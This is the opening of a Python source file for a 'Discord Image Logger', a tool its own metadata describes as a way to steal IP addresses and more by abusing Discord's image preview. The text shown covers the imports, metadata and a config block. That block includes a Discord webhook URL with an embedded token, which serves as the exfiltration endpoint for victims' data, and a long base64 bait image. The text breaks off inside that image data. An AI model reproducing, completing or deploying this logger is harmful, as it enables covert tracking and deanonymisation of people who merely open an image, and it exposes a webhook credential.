
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444333586852348047/QaYdiA_PjZJ13v09hotU4578MnC0-sdQiQJyEUYafbVJn3lm7W5oZYOGNy0ztsvSZz2e",
    "image": "data:image/jpeg;base64,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